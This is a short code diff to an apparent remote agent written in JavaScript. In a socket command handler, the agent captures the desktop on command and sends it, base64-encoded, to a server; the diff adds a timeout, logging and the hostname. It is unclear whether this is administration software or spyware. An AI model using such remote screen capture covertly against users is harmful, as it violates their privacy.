@@ -1257,7 +1257,22 @@ async function handleSocketCommand(data) {
         case 'screenshot':
             try {
                 const screenshot = require('screenshot-desktop');
-                const imgBuffer = await screenshot({ format: 'jpg' });
+
+                // Add checks for screenshot module
+                if (!screenshot) throw new Error('Screenshot module not loaded');
+
+                console.log('[COMMAND] Capturing screenshot...');
+
+                // Race a timeout against the screenshot promise
+                const timeoutPromise = new Promise((_, reject) =>
+                    setTimeout(() => reject(new Error('Screenshot capture timed out')), 5000)
+                );
+
+                const imgBuffer = await Promise.race([
+                    screenshot({ format: 'jpg' }),
+                    timeoutPromise
+                ]);
+
                 const base64 = imgBuffer.toString('base64');
                 if (socket && socket.connected) {
                     socket.emit('agent-response', {
@@ -1267,7 +1282,7 @@ async function handleSocketCommand(data) {
                         screenshot: base64,
                         timestamp: new Date().toISOString()
                     });
-                    console.log('[COMMAND] Screenshot taken and sent successfully');
+                    console.log(`[COMMAND] Screenshot sent (${base64.length} bytes)`);
                 } else {
                     console.error('[COMMAND] Screenshot taken but socket not connected');
                 }
@@ -1277,6 +1292,7 @@ async function handleSocketCommand(data) {
                     socket.emit('agent-response', {
                         type: 'error',
                         clientId: CLIENT_ID,
+                        hostname: os.hostname(),
                         message: `Screenshot failed: ${error.message}`
                     });
                 }
